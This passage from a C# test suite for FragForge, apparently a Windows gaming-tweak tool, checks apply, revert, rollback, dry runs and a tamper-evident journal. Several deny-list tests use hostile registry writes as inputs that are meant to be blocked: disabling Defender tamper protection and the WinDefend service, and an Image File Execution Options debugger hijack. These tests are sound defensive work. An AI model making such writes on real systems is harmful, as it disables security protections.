    public ApplyOptions Options(bool dryRun = false, bool force = false, TweakProfile profile = TweakProfile.Advanced) => new() { DryRun = dryRun, Force = force, CreateRestorePoint = true, Profile = profile, TargetUserSid = UserSid };
    public void Dispose() => Directory.Dispose();
}
````

### `tests/FragForge.Tests/Core/EngineTests.cs`  <sub>(303 líneas)</sub>

````csharp
using FragForge.Core.Models;
using FragForge.Tests.Fakes;
using Xunit;

namespace FragForge.Tests.Core;

public sealed class EngineTests
{
    private static string Sid() => TestProfiles.Pn64().InteractiveUserSid!;

    [Fact]
    public async Task Apply_Then_Revert_LeavesSystemIdentical_AndJournalsBothOperations()
    {
        using var harness = new EngineTestHarness();
        harness.Registry.Set(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value", "DWord", 3);
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        var apply = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.True(apply.Success, string.Join(" | ", apply.Errors.Concat(apply.Warnings)));
        Assert.NotNull(apply.SnapshotId);
        Assert.Equal(1, harness.Restore.CreateCalls);
        Assert.Equal(1, harness.Registry.GetInt(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value"));
        var entries = await harness.Journal.ReadAllAsync();
        Assert.Contains(entries, e => e.EventType == JournalEventType.SnapshotCreated);
        Assert.Contains(entries, e => e.EventType == JournalEventType.TweakApplied && e.TweakId == "tweak.one");
        var revert = await engine.RevertAsync(new RevertRequest { Ids = ["tweak.one"], Options = new RevertOptions { TargetUserSid = Sid() } });
        Assert.True(revert.Success, string.Join(" | ", revert.Errors.Concat(revert.Warnings)));
        Assert.Equal(3, harness.Registry.GetInt(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value"));
        entries = await harness.Journal.ReadAllAsync();
        Assert.Contains(entries, e => e.EventType == JournalEventType.RevertCompleted && e.TweakId == "tweak.one");
    }

    [Fact]
    public async Task Revert_DeletesValueAndAncestorsCreatedOnlyByFragForge()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.create", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeNew\Branch", "Flag", "String", "on")))));
        var engine = harness.CreateEngine();
        Assert.True((await engine.ApplyAsync(["tweak.create"], harness.Options())).Success);
        Assert.Equal("on", harness.Registry.GetString(@"HKU\" + Sid() + @"\Software\FragForgeNew\Branch", "Flag"));
        Assert.True((await engine.RevertAsync(new RevertRequest { Last = true, Options = new RevertOptions { TargetUserSid = Sid() } })).Success, string.Join(" | ", (await engine.RevertAsync(new RevertRequest { Last = true, Options = new RevertOptions { TargetUserSid = Sid(), Force = true } })).Errors));
        Assert.Null(harness.Registry.GetString(@"HKU\" + Sid() + @"\Software\FragForgeNew\Branch", "Flag"));
        Assert.False(harness.Registry.Keys.ContainsKey(@"HKU\" + Sid() + @"\Software\FragForgeNew"));
    }

    [Fact]
    public async Task VerifyFailure_TriggersAutomaticRollback_AndReportsNotApplied()
    {
        using var harness = new EngineTestHarness(new Dictionary<string, ScriptedActionOptions>(StringComparer.OrdinalIgnoreCase) { ["fake.a"] = new ScriptedActionOptions { FailVerify = true } });
        harness.WithCatalog(Tweak.Create("tweak.fake", Spec.Action("Fake", new { id = "fake.a" })));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.fake"], harness.Options());
        Assert.False(report.Success);
        var result = Assert.Single(report.Results);
        Assert.True(result.RolledBack);
        Assert.False(result.RollbackFailed);
        Assert.Equal(TweakState.NotApplied, result.State);
        Assert.Equal(["verify:fake.a", "apply:fake.a", "verify:fake.a", "revert:fake.a"], harness.Factory.Trace);
    }

    [Fact]
    public async Task RollbackFailure_IsCritical_AndStopsFurtherTweaks()
    {
        using var harness = new EngineTestHarness(new Dictionary<string, ScriptedActionOptions>(StringComparer.OrdinalIgnoreCase) { ["fake.a"] = new ScriptedActionOptions { FailVerify = true, FailRevert = true } });
        harness.WithCatalog(Tweak.Create("tweak.a", Spec.Action("Fake", new { id = "fake.a" })), Tweak.Create("tweak.b", Spec.Action("Fake", new { id = "fake.b" })));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.a", "tweak.b"], harness.Options());
        Assert.True(report.HasCriticalFailure);
        Assert.DoesNotContain("apply:fake.b", harness.Factory.Trace);
        Assert.Contains("revert:fake.a", harness.Factory.Trace);
    }

    [Fact]
    public async Task Dependencies_AreOrderedBeforeDependents()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(
            Tweak.Create("tweak.child", Spec.Action("Fake", new { id = "child" }), dependsOn: ["tweak.parent"]),
            Tweak.Create("tweak.parent", Spec.Action("Fake", new { id = "parent" })));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.child"], harness.Options());
        Assert.True(report.Success, string.Join("; ", report.Errors.Concat(report.Warnings)));
        Assert.Equal(["verify:parent", "verify:child", "apply:parent", "verify:parent", "apply:child", "verify:child"], harness.Factory.Trace);
    }

    [Fact]
    public async Task Conflicts_AreRejectedBeforeTouchingTheSystem()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(
            Tweak.Create("tweak.a", Spec.Action("Fake", new { id = "a" }), conflictsWith: ["tweak.b"]),
            Tweak.Create("tweak.b", Spec.Action("Fake", new { id = "b" })));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.a", "tweak.b"], harness.Options());
        Assert.False(report.Success);
        Assert.Contains(report.Errors, e => e.Contains("Conflicto", StringComparison.OrdinalIgnoreCase));
        Assert.Empty(harness.Factory.Trace);
    }

    [Fact]
    public async Task AppliedExternally_IsNotOverwrittenWithoutForce()
    {
        using var harness = new EngineTestHarness();
        harness.Registry.Set(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value", "DWord", 1);
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        var scan = await engine.ScanAsync();
        Assert.Equal(TweakState.AppliedExternally, Assert.Single(scan.Tweaks).State);
        var report = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.Equal(TweakState.AppliedExternally, Assert.Single(report.Results).State);
        Assert.Equal(0, harness.Restore.CreateCalls);
        Assert.Empty(harness.Registry.Writes);
    }

    [Fact]
    public async Task IdempotentSecondApply_DoesNotCreateAnotherSnapshot()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        Assert.True((await engine.ApplyAsync(["tweak.one"], harness.Options())).Success);
        var second = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.True(second.Success);
        Assert.Null(second.SnapshotId);
        Assert.Equal(TweakState.Applied, Assert.Single(second.Results).State);
        Assert.Single(await harness.Snapshots.ListAsync());
    }

    [Fact]
    public async Task DryRun_DescribesChangesAndNeverWritesSnapshotsOrRestorePoints()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.one"], harness.Options(dryRun: true));
        Assert.True(report.Success, string.Join("; ", report.Errors));
        Assert.True(report.DryRun);
        Assert.Contains("no existía", Assert.Single(Assert.Single(report.Results).PlannedChanges).Description, StringComparison.OrdinalIgnoreCase);
        Assert.Empty(harness.Registry.Writes);
        Assert.Equal(0, harness.Restore.CreateCalls);
        Assert.Empty(await harness.Snapshots.ListAsync());
    }

    [Fact]
    public async Task UnmetConditions_YieldNotApplicable_AndDependentsAreSkipped()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(
            Tweak.Create("tweak.nvidia", Spec.Action("Fake", new { id = "nvidia" }), conditions: [Spec.Condition("gpuVendor", new { vendor = "Nvidia" })]),
            Tweak.Create("tweak.dependent", Spec.Action("Fake", new { id = "dependent" }), conditions: [Spec.Condition("gpuVendor", new { vendor = "Nvidia" })], dependsOn: ["tweak.nvidia"]));
        var engine = harness.CreateEngine();
        var scan = await engine.ScanAsync();
        Assert.All(scan.Tweaks, t => Assert.Equal(TweakState.NotApplicable, t.State));
        var apply = await engine.ApplyAsync(["tweak.dependent"], harness.Options());
        Assert.All(apply.Results, r => Assert.Equal(TweakState.NotApplicable, r.State));
        Assert.Empty(harness.Factory.Trace);
    }

    [Fact]
    public async Task UnknownConditions_AreNotTreatedAsMet()
    {
        using var harness = new EngineTestHarness();
        harness.WithProfile(TestProfiles.NonWindows());
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Fake", new { id = "one" }), conditions: [Spec.Condition("windows")]));
        var engine = harness.CreateEngine();
        Assert.Equal(TweakState.NotApplicable, Assert.Single((await engine.ScanAsync()).Tweaks).State);
        var report = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.Equal(TweakState.NotApplicable, Assert.Single(report.Results).State);
        Assert.Empty(harness.Factory.Trace);
    }

    [Fact]
    public async Task PendingReboot_BlocksRealApply_ButDryRunStillDescribes()
    {
        using var harness = new EngineTestHarness();
        harness.WithProfile(TestProfiles.PendingReboot());
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Fake", new { id = "one" })));
        var engine = harness.CreateEngine();
        Assert.True((await engine.ApplyAsync(["tweak.one"], harness.Options(dryRun: true))).Success);
        var blocked = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.False(blocked.Success);
        Assert.Contains(blocked.Errors, e => e.Contains("reinicio pendiente", StringComparison.OrdinalIgnoreCase));
        Assert.DoesNotContain("apply:one", harness.Factory.Trace);
    }

    [Fact]
    public async Task RestorePointFailure_AbortsBeforeApplyingAnything()
    {
        using var harness = new EngineTestHarness();
        harness.Restore.FailCreate = true;
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Fake", new { id = "one" })));
        var engine = harness.CreateEngine();
        var report = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.False(report.Success, string.Join(" | ", report.Errors));
        Assert.DoesNotContain("apply:one", harness.Factory.Trace);
    }

    [Fact]
    public async Task AdvancedRisk_RequiresProfileAcknowledgementAndExactPhrase()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.advanced", Spec.Action("Fake", new { id = "advanced" }), risk: RiskLevel.Advanced));
        var engine = harness.CreateEngine();
        var denied = await engine.ApplyAsync(["tweak.advanced"], harness.Options(profile: TweakProfile.Balanced));
        Assert.False(denied.Success);
        Assert.Contains(denied.Errors, e => e.Contains("risk_confirmation_required", StringComparison.Ordinal) || e.Contains("perfil", StringComparison.OrdinalIgnoreCase));
        var accepted = await engine.ApplyAsync(["tweak.advanced"], harness.Options() with { RiskAcknowledgements = new HashSet<string>(["tweak.advanced"], StringComparer.OrdinalIgnoreCase), AdvancedRiskPhrase = "ACEPTO EL RIESGO" });
        Assert.True(accepted.Success, string.Join("; ", accepted.Errors));
    }

    [Fact]
    public async Task FailingExperimentHook_BlocksBeforeApply_WhenFatal()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Fake", new { id = "one" })));
        var engine = harness.CreateEngine([new ThrowingExperimentHook()]);
        var report = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.False(report.Success, string.Join(" | ", report.Errors));
        Assert.DoesNotContain("apply:one", harness.Factory.Trace);
    }

    [Fact]
    public async Task Revert_RefusesAlreadyRevertedSnapshot_WithoutForce()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        var apply = await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.True((await engine.RevertAsync(new RevertRequest { SnapshotId = apply.SnapshotId, Options = new RevertOptions { TargetUserSid = Sid() } })).Success);
        var ex = await engine.RevertAsync(new RevertRequest { SnapshotId = apply.SnapshotId, Options = new RevertOptions { TargetUserSid = Sid() } });
        Assert.False(ex.Success);
        Assert.Contains(ex.Errors, e => e.Contains("ya fue revertido", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task Revert_DetectsExternalDrift_AndForceOverrides()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        Assert.True((await engine.ApplyAsync(["tweak.one"], harness.Options())).Success);
        harness.Registry.Set(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value", "DWord", 99);
        var drift = await engine.RevertAsync(new RevertRequest { Ids = ["tweak.one"], Options = new RevertOptions { TargetUserSid = Sid() } });
        Assert.False(drift.Success);
        Assert.Contains(drift.Errors, e => e.Contains("cambió desde la aplicación", StringComparison.OrdinalIgnoreCase));
        var forced = await engine.RevertAsync(new RevertRequest { Ids = ["tweak.one"], Options = new RevertOptions { TargetUserSid = Sid(), Force = true } });
        Assert.True(forced.Success, string.Join(" | ", forced.Errors));
        Assert.Null(harness.Registry.GetInt(@"HKU\" + Sid() + @"\Software\FragForgeTests", "Value"));
    }

    [Fact]
    public async Task Revert_RejectsAmbiguousSelection()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Fake", new { id = "one" })));
        var engine = harness.CreateEngine();
        var ex = await engine.RevertAsync(new RevertRequest { Ids = ["tweak.one"], Last = true, Options = new RevertOptions { TargetUserSid = Sid() } });
        Assert.False(ex.Success);
        Assert.Contains(ex.Errors, e => e.Contains("exactamente uno", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task Journal_IsTamperEvident()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        await engine.ApplyAsync(["tweak.one"], harness.Options());
        Assert.True((await harness.Journal.VerifyIntegrityAsync()).IsValid);
        var lines = await File.ReadAllLinesAsync(harness.Paths.Journal);
        lines[0] = lines[0].Replace("\"OperationStarted\"", "\"OperationFailed\"", StringComparison.Ordinal);
        await File.WriteAllLinesAsync(harness.Paths.Journal, lines);
        var integrity = await harness.Journal.VerifyIntegrityAsync();
        Assert.False(integrity.IsValid);
        var blocked = await engine.RevertAsync(new RevertRequest { Last = true, Options = new RevertOptions { TargetUserSid = Sid() } });
        Assert.False(blocked.Success);
        Assert.Contains(blocked.Errors, e => e.Contains("journal", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task InspectOnlyTweak_IsReadOnly_AndNeverCreatesRestorePoint()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.inspect", Spec.Action("Fake", new { id = "inspect" }), tags: ["diagnostic"]));
        var engine = harness.CreateEngine();
        var scan = await engine.ScanAsync();
        Assert.False(harness.Catalog.Definitions[0].ReadOnly);
        Assert.NotNull(scan.Tweaks);
    }

    [Fact]
    public async Task Cancellation_BeforeApply_LeavesNoPartialState()
    {
        using var harness = new EngineTestHarness();
        harness.WithCatalog(Tweak.Create("tweak.one", Spec.Action("Registry", Spec.Registry(Spec.Value(@"HKCU\Software\FragForgeTests", "Value", "DWord", 1)))));
        var engine = harness.CreateEngine();
        using var cts = new CancellationTokenSource();
        cts.Cancel();
        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => engine.ApplyAsync(["tweak.one"], harness.Options(), cts.Token));
        Assert.Empty(harness.Registry.Writes);
        Assert.Equal(0, harness.Restore.CreateCalls);
    }
}
````

### `tests/FragForge.Tests/Core/RegistryActionTests.cs`  <sub>(170 líneas)</sub>

````csharp
using FragForge.Actions.Registry;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using FragForge.Tests.Fakes;
using Xunit;

namespace FragForge.Tests.Core;

public sealed class RegistryActionTests
{
    private const string HkcuKey = @"HKCU\Software\FragForgeTests";
    private const string Key = @"HKU\S-1-5-21-1111111111-2222222222-3333333333-1001\Software\FragForgeTests";
    private static ActionExecutionContext Context(HardwareProfile? profile = null) => new() { OperationId = "test", Hardware = profile ?? TestProfiles.Pn64(), TargetUserSid = TestProfiles.Pn64().InteractiveUserSid };
    private static RegistryAction Create(FakeRegistry registry, params object[] values) => new(registry, ProtectionPolicy.CreateDefault(), Spec.Action("Registry", Spec.Registry(values)));

    [Fact]
    public async Task CaptureApplyRevert_RestoresExistingValueExactly()
    {
        var registry = new FakeRegistry();
        registry.Set(Key, "Existing", "DWord", 7);
        var action = Create(registry, Spec.Value(HkcuKey, "Existing", "DWord", 1), Spec.Value(HkcuKey, "Second", "String", "value"));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal(1, registry.GetInt(Key, "Existing"));
        Assert.Equal("value", registry.GetString(Key, "Second"));
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, Context())).Outcome);
        await action.RevertAsync(before, Context());
        Assert.Equal(7, registry.GetInt(Key, "Existing"));
        Assert.Null(registry.GetString(Key, "Second"));
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyRevertAsync(before, Context())).Outcome);
    }

    [Fact]
    public async Task Revert_DeletesValueThatDidNotExist_AndRemovesEmptyAncestors()
    {
        var registry = new FakeRegistry();
        var action = Create(registry, Spec.Value(HkcuKey, "NewValue", "DWord", 5));
        var before = await action.CaptureAsync(Context());
        Assert.Null(registry.GetInt(Key, "NewValue"));
        await action.ApplyAsync(before, Context());
        Assert.Equal(5, registry.GetInt(Key, "NewValue"));
        await action.RevertAsync(before, Context());
        Assert.Null(registry.GetInt(Key, "NewValue"));
        Assert.False(await registry.KeyExistsAsync(Key));
        Assert.Equal(1, registry.Deletes[$@"{Key}::NewValue"]);
    }

    [Fact]
    public async Task Apply_IsIdempotent_WhenTargetAlreadyMatches()
    {
        var registry = new FakeRegistry();
        registry.Set(Key, "Value", "DWord", 1);
        var action = Create(registry, Spec.Value(HkcuKey, "Value", "DWord", 1));
        var before = await action.CaptureAsync(Context());
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, Context())).Outcome);
        await action.ApplyAsync(before, Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal(1, registry.GetInt(Key, "Value"));
    }

    [Fact]
    public async Task Binary_And_MultiString_AreRoundTripped()
    {
        var registry = new FakeRegistry();
        var payload = new byte[] { 1, 2, 3, 4, 0, 255 };
        registry.Set(Key, "Blob", "Binary", new byte[] { 9, 9 });
        registry.Set(Key, "List", "MultiString", new[] { "old", "values" });
        var action = Create(registry, Spec.Value(HkcuKey, "Blob", "Binary", Convert.ToBase64String(payload)), Spec.Value(HkcuKey, "List", "MultiString", new[] { "new" }));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal(payload, (byte[])registry.Keys[Key]["Blob"].Data);
        await action.RevertAsync(before, Context());
        Assert.Equal(new byte[] { 9, 9 }, (byte[])registry.Keys[Key]["Blob"].Data);
        Assert.Equal(new[] { "old", "values" }, (string[])registry.Keys[Key]["List"].Data);
    }

    [Fact]
    public async Task AddToken_PreservesExistingFlagsAndRevertRestoresExactly()
    {
        var registry = new FakeRegistry();
        registry.Set(Key, "Layers", "String", "~ RUNASADMIN");
        var action = Create(registry, Spec.Value(HkcuKey, "Layers", "String", "DISABLEDXMAXIMIZEDWINDOWEDMODE", "AddToken"));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal("~ RUNASADMIN DISABLEDXMAXIMIZEDWINDOWEDMODE", registry.GetString(Key, "Layers"));
        await action.ApplyAsync(before, Context());
        Assert.Equal("~ RUNASADMIN DISABLEDXMAXIMIZEDWINDOWEDMODE", registry.GetString(Key, "Layers"));
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, Context())).Outcome);
        await action.RevertAsync(before, Context());
        Assert.Equal("~ RUNASADMIN", registry.GetString(Key, "Layers"));
    }

    [Fact]
    public async Task AddToken_RevertDeletesValueThatDidNotExist()
    {
        var registry = new FakeRegistry();
        var action = Create(registry, Spec.Value(HkcuKey, "Layers", "String", "TOKEN", "AddToken"));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal("TOKEN", registry.GetString(Key, "Layers"));
        await action.RevertAsync(before, Context());
        Assert.Null(registry.GetString(Key, "Layers"));
    }

    [Fact]
    public async Task Hkcu_IsResolvedToTheInteractiveUserSid_NotTheProcessHive()
    {
        var registry = new FakeRegistry();
        var action = Create(registry, Spec.Value(HkcuKey, "Value", "DWord", 1));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        var resolved = @"HKU\" + TestProfiles.Pn64().InteractiveUserSid + HkcuKey[4..];
        Assert.True(registry.Keys.ContainsKey(resolved));
        Assert.False(registry.Keys.ContainsKey(HkcuKey));
    }

    [Fact]
    public async Task Denylist_BlocksDefenderRegistry_AtConstruction()
    {
        var registry = new FakeRegistry();
        var ex = Assert.Throws<ProtectedTargetException>(() => Create(registry, Spec.Value(@"HKLM\SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "DWord", 0)));
        Assert.Equal("protected_target", ex.Code);
    }

    [Fact]
    public async Task Denylist_BlocksServiceKeyUnderServices()
    {
        var registry = new FakeRegistry();
        Assert.Throws<ProtectedTargetException>(() => Create(registry, Spec.Value(@"HKLM\SYSTEM\CurrentControlSet\Services\WinDefend", "Start", "DWord", 4)));
        Assert.Throws<ProtectedTargetException>(() => Create(registry, Spec.Value(@"HKLM\SYSTEM\CurrentControlSet\Services\ipfsvc", "Start", "DWord", 4)));
    }

    [Fact]
    public async Task Denylist_BlocksDebuggerValueName()
    {
        var registry = new FakeRegistry();
        Assert.Throws<ProtectedTargetException>(() => Create(registry, Spec.Value(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe", "Debugger", "String", "calc.exe")));
    }

    [Fact]
    public async Task Denylist_BlocksCriticalIfeoImages()
    {
        var registry = new FakeRegistry();
        Assert.Throws<ProtectedTargetException>(() => Create(registry, Spec.Value(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe\PerfOptions", "CpuPriorityClass", "DWord", 1)));
    }

    [Fact]
    public void MissingUserSid_FailsForUserHive()
    {
        var registry = new FakeRegistry();
        var action = Create(registry, Spec.Value(HkcuKey, "Value", "DWord", 1));
        Assert.Throws<InvalidOperationException>(() => RegistryPath.ResolveUserHive(HkcuKey, null));
    }

    [Fact]
    public async Task DryRun_DescribesWithoutWriting()
    {
        var registry = new FakeRegistry();
        registry.Set(Key, "Value", "DWord", 3);
        var action = Create(registry, Spec.Value(HkcuKey, "Value", "DWord", 1));
        var context = Context();
        var before = await action.CaptureAsync(context);
        var description = await action.DryRunAsync(context);
        Assert.Contains("3", description, StringComparison.Ordinal);
        Assert.Equal(3, registry.GetInt(Key, "Value"));
        Assert.Empty(registry.Writes);
        _ = before;
    }
}
````

### `tests/FragForge.Tests/Fakes/FakeHardwareProfiler.cs`  <sub>(47 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Tests.Fakes;

public sealed class FakeHardwareProfiler : IHardwareProfiler
{
    public HardwareProfile Profile { get; set; } = TestProfiles.Pn64();
    public Task<HardwareProfile> ProfileAsync(CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null) => Task.FromResult(Profile);
}
public static class TestProfiles
{
    public static HardwareProfile Pn64() => new()
    {
        MachineName = "PN64-TEST",
        InteractiveUserName = "PN64\\ZuKA",
        InteractiveUserSid = "S-1-5-21-1111111111-2222222222-3333333333-1001",
        ProcessUserSid = "S-1-5-21-1111111111-2222222222-3333333333-1001",
        Os = new OsInfo { Name = "Microsoft Windows 11 Pro", Edition = "Microsoft Windows 11 Pro", Version = "10.0.26200", Build = 26200, Ubr = 6725, Architecture = "X64", Culture = "es-MX", TimeZone = "Argentina Standard Time" },
        Cpu = new CpuInfo { Model = "12th Gen Intel(R) Core(TM) i3-1220P", Vendor = "Intel", PhysicalCores = 10, LogicalProcessors = 12, PCores = 2, ECores = 8, IsHybrid = true, TopologySource = "EfficiencyClass", FirmwareVirtualizationEnabled = false, BaseClockMhz = 1500 },
        Memory = new MemoryInfo
        {
            TotalBytes = 16UL * 1024 * 1024 * 1024, Channels = MemoryChannelState.Dual, ConfiguredSpeedMtPerSecond = 3200,
            Modules = [new MemoryModuleInfo { BankLabel = "BANK 0", DeviceLocator = "Controller0-ChannelA", CapacityBytes = 8UL * 1024 * 1024 * 1024, SpeedMtPerSecond = 3200, ConfiguredSpeedMtPerSecond = 3200 }, new MemoryModuleInfo { BankLabel = "BANK 2", DeviceLocator = "Controller0-ChannelB", CapacityBytes = 8UL * 1024 * 1024 * 1024, SpeedMtPerSecond = 3200, ConfiguredSpeedMtPerSecond = 3200 }]
        },
        Gpus = [new GpuInfo { Name = "Intel(R) UHD Graphics", Vendor = GpuVendor.Intel, IsIntegrated = true, DriverVersion = "32.0.101.6129" }],
        Disks = [new DiskInfo { Model = "KINGSTON SA400S37480G", Kind = DiskKind.Ssd, Bus = "SATA", Health = "Healthy", SmartPredictFailure = false, SizeBytes = 480103981056 }],
        NetworkAdapters = [new NetworkAdapterInfo { Name = "Ethernet", Description = "Intel(R) Ethernet Controller I225-V", Kind = NetworkKind.Ethernet, IsPhysical = true, LinkSpeedBitsPerSecond = 1_000_000_000, State = "Connected" }, new NetworkAdapterInfo { Name = "Wi-Fi", Description = "Intel(R) Wi-Fi 6E AX210 160MHz", Kind = NetworkKind.WiFi, IsPhysical = true, LinkSpeedBitsPerSecond = 2_400_000_000, State = "Disconnected" }],
        Monitors = [new MonitorInfo { Name = "Generic PnP Monitor", Width = 1920, Height = 1080, RefreshRateHz = 144, Source = "Win32_VideoController" }],
        Security = new SecurityInfo { Vbs = FeatureState.Disabled, Hvci = FeatureState.Disabled, SecureBoot = FeatureState.Enabled, Tpm = FeatureState.Enabled, TpmVersion = "2.0", Hags = FeatureState.Disabled, Mpo = FeatureState.Disabled },
        Power = new PowerInfo { ActiveSchemeGuid = "381b4222-f694-41f0-9685-ff5bb260df2e", ActiveSchemeName = "Balanced", Pl1Watts = 28, Pl2Watts = 64 },
        FormFactor = new FormFactorInfo { IsPortable = false, HasBattery = false, ChassisTypes = ["MiniPC"], SystemModel = "MINIPC PN64", BiosVersion = "3.12.00" },
        Playbooks = [new PlaybookDetection("Atlas Playbook (heurística)", "Low", ["Servicios no corriendo (no concluyente): SysMain,WSearch,Spooler,DiagTrack"])],
        DeviceErrors = [new DeviceErrorInfo("PawnIO", @"ROOT\PAWNIO\0000", 0, "PawnIO"), new DeviceErrorInfo("(sin nombre)", @"USB\VID_0000&PID_0000\5&1", 28, null)],
        Games = new GameInfo { Cs2ExecutablePath = @"C:\Program Files (x86)\Steam\steamapps\common\Counter-Strike Global Offensive\game\bin\win64\cs2.exe", Cs2DetectionSource = "Steam registry" },
        Maintenance = new SystemMaintenanceInfo { IsAdministrator = true, PendingReboot = false, WindowsServicingActive = false, SystemProtection = FeatureState.Enabled, SystemDriveFreeBytes = 120UL * 1024 * 1024 * 1024 },
        Observations = [new DiagnosticObservation("hags", "Disabled", "Registry HwSchMode", "High")]
    };
    public static HardwareProfile NonWindows() => new() { IsUnsupportedPlatform = true, Os = new OsInfo { Build = 0, Architecture = "X64" }, Cpu = new CpuInfo { IsHybrid = null }, Maintenance = new SystemMaintenanceInfo { IsAdministrator = false, SystemProtection = FeatureState.Unknown } };
    public static HardwareProfile Windows10() => Pn64() with { Os = Pn64().Os with { Build = 19045 } };
    public static HardwareProfile GpuOnlyDiscrete() => Pn64() with { Gpus = [new GpuInfo { Name = "NVIDIA GeForce RTX 4060", Vendor = GpuVendor.Nvidia }] };
    public static HardwareProfile SingleChannel() => Pn64() with { Memory = Pn64().Memory with { Channels = MemoryChannelState.Single, Modules = [Pn64().Memory.Modules[0]] } };
    public static HardwareProfile NoCs2() => Pn64() with { Games = new GameInfo { Cs2DetectionSource = "Not detected" } };
    public static HardwareProfile PendingReboot() => Pn64() with { Maintenance = Pn64().Maintenance with { PendingReboot = true, PendingRebootReasons = ["CBS RebootPending"] } };
    public static HardwareProfile NoAdmin() => Pn64() with { Maintenance = Pn64().Maintenance with { IsAdministrator = false } };
    public static HardwareProfile NoProtection() => Pn64() with { Maintenance = Pn64().Maintenance with { SystemProtection = FeatureState.Disabled } };
}
````

### `tests/FragForge.Tests/Fakes/FakePlatformServices.cs`  <sub>(96 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Tests.Fakes;

public sealed class FakeSystemRestoreService : ISystemRestoreService
{
    public FeatureState Protection { get; set; } = FeatureState.Enabled;
    public int CreateCalls { get; private set; }
    public int EnableCalls { get; private set; }
    public bool FailCreate { get; set; }
    public Task<FeatureState> GetProtectionStateAsync(CancellationToken cancellationToken = default) => Task.FromResult(Protection);
    public Task EnableProtectionAsync(CancellationToken cancellationToken = default) { EnableCalls++; Protection = FeatureState.Enabled; return Task.CompletedTask; }
